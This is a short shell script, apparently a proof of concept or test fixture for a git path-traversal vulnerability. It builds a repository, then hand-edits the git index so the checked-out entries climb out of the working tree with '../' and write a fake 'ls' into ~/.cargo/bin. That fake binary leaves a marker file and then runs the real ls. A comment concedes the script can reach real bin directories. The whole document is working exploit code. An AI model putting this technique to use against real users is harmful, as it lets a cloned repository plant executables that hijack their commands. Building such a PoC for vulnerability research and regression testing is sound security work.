#!/bin/sh
# TODO: Before using in tests, limit this to never target real bin dirs!
set -eu

repo="$1"

git init -- "$repo"
cd -- "$repo"

cat >ls.tmp <<'EOF'
#!/bin/sh
printf 'Vulnerable!\n'
date >~/vulnerable
exec /bin/ls "$@"
EOF

upward='..'
for subdir in .a .b .c .d .e .f .g .h .i .j; do
    upward="..@$upward"
    cp -- ls.tmp "$subdir@$upward@.cargo@bin@ls"
    mkdir -- "$subdir"
    touch -- "$subdir/.keep"
done

rm ls.tmp
git add .
ex -s -c '%s/@\.\./\/../g' -c '%s/@\.cargo@bin@ls/\/.cargo\/bin\/ls/g' -c 'x' .git/index
git commit -m 'Initial commit'
git show --stat
